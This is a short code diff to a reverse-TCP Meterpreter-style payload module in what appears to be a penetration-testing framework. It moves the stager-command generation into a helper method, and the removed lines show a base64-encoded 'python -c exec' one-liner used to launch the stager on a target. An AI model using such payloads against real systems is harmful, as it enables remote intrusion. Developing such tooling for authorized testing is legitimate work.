@@ -7,6 +7,8 @@ import base64
 import struct
 
 class Module(Payload):
+    CLIENT_LANGUAGE = "python"
+
     __info__ = {
         'name': 'Python Meterpreter, Reverse TCP',
         'description': 'Meterpreter-like payload that connects back via TCP (requires Python on target)',
@@ -876,15 +878,8 @@ if __name__ == '__main__':
         
         # Store the full Meterpreter stage code for the listener to send
         self.meterpreter_stage_code = meterpreter_code
-        
-        # Return the command to execute the stager (small payload)
-        # Encode the stager code to avoid issues with quotes
-        encoded_stager = base64.b64encode(stager_code.encode('utf-8')).decode('utf-8')
-        
-        # Generate the command (no arguments needed, lhost and lport are in the code)
-        command = f'''{self.python_binary} -c "import base64; exec(base64.b64decode('{encoded_stager}').decode('utf-8'))"'''
-        
-        return command
+
+        return self._encode_python_one_liner(stager_code.strip(), self.python_binary)
     
     def get_stage_code(self):
         """Get the full Meterpreter stage code to send to the stager"""
